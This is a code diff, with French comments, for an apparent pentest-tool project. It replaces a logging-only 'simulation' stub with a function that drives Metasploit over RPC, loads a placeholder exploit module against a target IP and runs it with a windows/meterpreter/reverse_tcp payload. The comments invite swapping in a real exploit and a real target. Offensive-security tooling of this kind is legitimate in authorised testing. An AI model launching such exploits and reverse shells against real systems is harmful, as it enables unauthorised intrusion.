@@ -1,11 +1,21 @@
-import subprocess
-from logger import log_info, log_error, save_result
+from pymetasploit3.msfrpc import MsfRpcClient
 
-def run_metasploit_attack():
-    target = input("Entrez l'adresse IP cible : ")
-    log_info(f"Simulation d'attaque Metasploit lancée pour la cible : {target}")
+def run_metasploit_scan(target):
+    # Remplacez 'my_password' par le mot de passe de votre choix pour la connexion RPC à Metasploit
+    client = MsfRpcClient('password', server='localhost', port=55553, ssl=False)
 
-    # Ajouter votre code pour exécuter la simulation d'attaque Metasploit
+    # Utilisez l'exploit 'example_exploit' comme exemple, remplacez-le par un exploit réel
+    exploit = client.modules.use('exploit', 'example_exploit')
+    exploit['RHOSTS'] = target
 
-    log_info(f"Simulation d'attaque Metasploit terminée pour la cible : {target}")
-    save_result("Résultat de la simulation d'attaque Metasploit", result_file="results/metasploit_results.txt")
+    # Configurez le payload (exemple: windows/meterpreter/reverse_tcp)
+    payload = 'windows/meterpreter/reverse_tcp'
+    exploit.execute(payload=payload)
+
+    # Fermez la connexion RPC
+    client.logout()
+
+# Exemple d'utilisation de la fonction
+if __name__ == '__main__':
+    target = '192.168.1.2'  # Remplacez par l'adresse IP cible réelle
+    run_metasploit_scan(target)
